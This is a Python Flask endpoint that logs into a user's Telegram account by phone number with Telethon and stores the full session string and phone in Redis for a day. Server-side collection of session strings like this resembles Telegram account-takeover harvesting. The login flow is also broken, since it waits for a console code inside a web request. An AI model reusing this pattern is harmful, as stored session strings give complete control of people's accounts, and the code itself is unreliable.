from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import redis
import os

app = Flask(__name__)

# Telegram credentials
api_id = int(os.environ.get("TELEGRAM_API_ID"))
api_hash = os.environ.get("TELEGRAM_API_HASH")

# Redis client using redis:// or rediss:// URL
redis_client = redis.Redis.from_url(os.environ.get("UPSTASH_REDIS_REST_URL"))  # Must be rediss://...

@app.route('/api/save-userinfo', methods=['POST'])
def save_userinfo():
    try:
        data = request.get_json()
        user_id = data.get("userId")
        phone = data.get("phone")

        if not user_id or not phone:
            return jsonify({"error": "Missing userId or phone"}), 400

        with TelegramClient(StringSession(), api_id, api_hash) as client:
            client.start(phone=phone)
            string_session = client.session.save()

            # Save to Redis
            redis_client.setex(f"tg:session:{user_id}", 60 * 60 * 24, string_session)
            redis_client.setex(f"tg:phone:{user_id}", 60 * 60 * 24, phone)

        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
